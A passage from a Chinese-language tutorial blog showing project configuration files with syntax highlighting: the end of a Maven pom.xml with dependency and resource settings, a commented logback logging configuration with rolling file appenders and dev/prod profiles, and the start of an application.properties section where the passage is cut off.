class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aliyun-sdk-vod-upload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;aliyun-sdk-vod-upload.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;fastjson.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.json<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>json<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;json.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-dbutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-dbutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;commons-dbutils.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.otter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>canal.client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;canal.client.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 配置资源路径和xml路径 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>false<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 将resources目录下的properties和xml文件都加载进来 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>false<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="二-log-xml"><a href="#二-log-xml" class="headerlink" title="二. log.xml"></a>二. log.xml</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>  <span class="attr">scan</span>=<span class="string">"true"</span> <span class="attr">scanPeriod</span>=<span class="string">"10 seconds"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 日志级别从低到高分为TRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL，如果设置为WARN，则低于WARN的信息都不会输出 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- scan:当此属性设置为true时，配置文件如果发生改变，将会被重新加载，默认值为true --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- scanPeriod:设置监测配置文件是否有修改的时间间隔，如果没有给出时间单位，默认单位是毫秒。当scan为true时，此属性生效。默认的时间间隔为1分钟。 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- de<span class="doctag">bug:</span>当此属性设置为true时，将打印出logback内部日志信息，实时查看logback运行状态。默认值为false。 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">contextName</span>&gt;</span>logback<span class="tag">&lt;/<span class="name">contextName</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- name的值是变量的名称，value的值时变量定义的值。通过定义的值会被插入到logger上下文中。定义变量后，可以使“$&#123;&#125;”来使用变量。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"log.path"</span> <span class="attr">value</span>=<span class="string">"./log"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 彩色日志 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 配置格式变量：CONSOLE_LOG_PATTERN 彩色日志格式 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- magenta:洋红 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- boldMagenta:粗红--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- cyan:青色 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- white:白色 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- magenta:洋红 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"CONSOLE_LOG_PATTERN"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">value</span>=<span class="string">"%yellow(%date&#123;yyyy-MM-dd HH:mm:ss&#125;) |%highlight(%-5level) |%blue(%thread) |%blue(%file:%line) |%green(%logger) |%cyan(%msg%n)"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--输出到控制台--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"CONSOLE"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--此日志appender是为开发使用，只配置最底级别，控制台输出的日志级别是大于或等于此级别的日志信息--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 例如：如果此处配置了INFO级别，则后面其他位置即使配置了DEBUG级别的日志，也不会被输出 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.ThresholdFilter"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">level</span>&gt;</span>INFO<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>$&#123;CONSOLE_LOG_PATTERN&#125;<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 设置字符集 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">charset</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--输出到文件--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 时间滚动输出 level为 INFO 日志 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"INFO_FILE"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.RollingFileAppender"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 正在记录的日志文件的路径及文件名 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;log.path&#125;/log_info.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--日志文件输出格式--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">charset</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.TimeBasedRollingPolicy"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 每天日志归档路径以及格式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;log.path&#125;/info/log-info-%d&#123;yyyy-MM-dd&#125;.%i.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">timeBasedFileNamingAndTriggeringPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>100MB<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">timeBasedFileNamingAndTriggeringPolicy</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--日志文件保留天数--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>15<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 此日志文件只记录info级别的 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.LevelFilter"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">level</span>&gt;</span>INFO<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMatch</span>&gt;</span>ACCEPT<span class="tag">&lt;/<span class="name">onMatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMismatch</span>&gt;</span>DENY<span class="tag">&lt;/<span class="name">onMismatch</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 时间滚动输出 level为 WARN 日志 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"WARN_FILE"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.RollingFileAppender"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 正在记录的日志文件的路径及文件名 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;log.path&#125;/log_warn.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--日志文件输出格式--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">charset</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span> <span class="comment">&lt;!-- 此处设置字符集 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.TimeBasedRollingPolicy"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;log.path&#125;/warn/log-warn-%d&#123;yyyy-MM-dd&#125;.%i.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">timeBasedFileNamingAndTriggeringPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>100MB<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">timeBasedFileNamingAndTriggeringPolicy</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--日志文件保留天数--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>15<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 此日志文件只记录warn级别的 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.LevelFilter"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">level</span>&gt;</span>warn<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMatch</span>&gt;</span>ACCEPT<span class="tag">&lt;/<span class="name">onMatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMismatch</span>&gt;</span>DENY<span class="tag">&lt;/<span class="name">onMismatch</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 时间滚动输出 level为 ERROR 日志 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"ERROR_FILE"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.RollingFileAppender"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 正在记录的日志文件的路径及文件名 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;log.path&#125;/log_error.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--日志文件输出格式--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">charset</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span> <span class="comment">&lt;!-- 此处设置字符集 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.TimeBasedRollingPolicy"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;log.path&#125;/error/log-error-%d&#123;yyyy-MM-dd&#125;.%i.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">timeBasedFileNamingAndTriggeringPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>100MB<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">timeBasedFileNamingAndTriggeringPolicy</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--日志文件保留天数--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>15<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 此日志文件只记录ERROR级别的 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.LevelFilter"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">level</span>&gt;</span>ERROR<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMatch</span>&gt;</span>ACCEPT<span class="tag">&lt;/<span class="name">onMatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMismatch</span>&gt;</span>DENY<span class="tag">&lt;/<span class="name">onMismatch</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        &lt;logger&gt;用来设置某一个包或者具体的某一个类的日志打印级别、以及指定&lt;appender&gt;。</span></span><br><span class="line"><span class="comment">        &lt;logger&gt;仅有一个name属性，</span></span><br><span class="line"><span class="comment">        一个可选的level和一个可选的addtivity属性。</span></span><br><span class="line"><span class="comment">        name:用来指定受此logger约束的某一个包或者具体的某一个类。</span></span><br><span class="line"><span class="comment">        level:用来设置打印级别，大小写无关：TRACE, DEBUG, INFO, WARN, ERROR, ALL 和 OFF，</span></span><br><span class="line"><span class="comment">              如果未设置此属性，那么当前logger将会继承上级的级别。</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        使用mybatis的时候，sql语句是debug下才会打印，而这里我们只配置了info，所以想要查看sql语句的话，有以下两种操作：</span></span><br><span class="line"><span class="comment">        第一种把&lt;root level="INFO"&gt;改成&lt;root level="DEBUG"&gt;这样就会打印sql，不过这样日志那边会出现很多其他消息</span></span><br><span class="line"><span class="comment">        第二种就是单独给mapper下目录配置DEBUG模式，代码如下，这样配置sql语句会打印，其他还是正常DEBUG级别：</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--开发环境:打印控制台--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">"dev"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--可以输出项目中的debug日志，包括mybatis的sql日志--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">"com.guli"</span> <span class="attr">level</span>=<span class="string">"INFO"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">            root节点是必选节点，用来指定最基础的日志输出级别，只有一个level属性</span></span><br><span class="line"><span class="comment">            level:用来设置打印级别，大小写无关：TRACE, DEBUG, INFO, WARN, ERROR, ALL 和 OFF，默认是DEBUG</span></span><br><span class="line"><span class="comment">            可以包含零个或多个appender元素。</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">"INFO"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"CONSOLE"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"INFO_FILE"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"WARN_FILE"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"ERROR_FILE"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--生产环境:输出到文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">"pro"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">"INFO"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"CONSOLE"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"DEBUG_FILE"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"INFO_FILE"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"ERROR_FILE"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"WARN_FILE"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="三-properties"><a href="#三-properties" class="headerlink" title="三.  properties"></a>三.  properties</h1><h3 id="3-1-application-properties"><a href="#3-1-application-properties" class="headerlink" title="3.1 application.properties"></a>3.1 application.properties</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 